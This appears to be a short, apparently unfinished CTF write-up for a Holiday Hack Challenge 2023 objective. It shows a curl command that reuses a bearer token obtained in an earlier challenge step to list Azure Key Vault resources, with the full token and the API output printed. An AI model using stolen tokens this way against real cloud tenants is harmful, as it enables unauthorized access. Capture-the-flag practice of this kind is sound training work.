# Objective 19: Active Directory
**Location: Pixel Island: Raincaster Cliffs**  
**Hints provided by Ribb Bonbowford**

This objective is a continuation of [Objective 17: Certificate SSHenanigans](https://github.com/joergschwarzwaelder/hhc2023/tree/main/Objective-17). It is a prerequisite to have this already cleared.

The aim is to get hold of the name of the secret file stored on the "FileShare".

With the help of the Bearer token from objective 17, we can check in https://management.azure.com for resources:
```
joergen@northpole:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIxNTE4MTcsIm5iZiI6MTcwMjE1MTgxNywiZXhwIjoxNzAyMjM4NTE3LCJhaW8iOiJFMlZnWVBCeS83NzZRa3NrcDh1RC9qZThaZ21xQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiI0anVoQTFUOVdFYWlGZWxpeFRITEFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.IS06qvLjcl38JvzRHeBPFoLZk5NREXcPFZyha4CITtcP-4VMHHPrfqpTPgl1U7C_ENrcJCbDrS3L6MhvkpcDwQ1tpAb7zuQrLL6Gk6IzpVMbeoYhqJi7LFiTARmC5TsSZdQF258R2fpqr9Py3Mug6QsVZH0nxrf-KDtzb_VrOvmulfZLsaEebjHJSEFFgaaUKPTNfTuQCMdhuGoV1t0CzTPEY_AVTfTBRlmtxiJMY4miBjINYqpUN5TWFQT7B81L_4HWu4hJoE_IbYE-4MWTI4VNPmiCeIMlJNM1o3XqI3AzVz3pGD5gv0UPa3Vi9bXIcG7_6eIeIInoeSNCHwMOSA' https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2023-07-01 | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   489  100   489    0     0   1408      0 --:--:-- --:--:-- --:--:--  1405
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    }
  ]
}
```



**Achievement: Ipsum**
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTUzMzI1OTQ0OCwxMDg3ODUzMTQ3LC0yMD
EwMTkyNjNdfQ==
-->